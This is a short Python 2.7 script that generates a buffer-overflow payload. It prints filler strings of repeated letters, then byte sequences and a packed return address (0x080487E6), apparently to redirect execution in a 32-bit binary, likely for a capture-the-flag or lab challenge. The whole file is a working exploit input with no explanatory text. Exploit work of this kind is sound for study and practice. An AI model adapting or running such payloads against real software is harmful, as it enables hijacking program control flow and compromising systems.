#!/usr/bin/python2.7
import struct

RA_FROM_CONCATENATE_FIRST_CHARS = 0x080487E6

for c in range(0x41, 0x50):
	char_endline = chr(c+10).lower()
	if c is 0x4d:
		print("\xfd\x86" * 8)
	elif c is 0x4e:
		print("\x04\x08" * 8)
	elif c is 0x4f:
		print(struct.pack("<I", RA_FROM_CONCATENATE_FIRST_CHARS)) 
	else:
		print(chr(c)*16 + char_endline)
		#print(struct.pack("<I", RA_FROM_CONCATENATE_FIRST_CHARS) * 4)
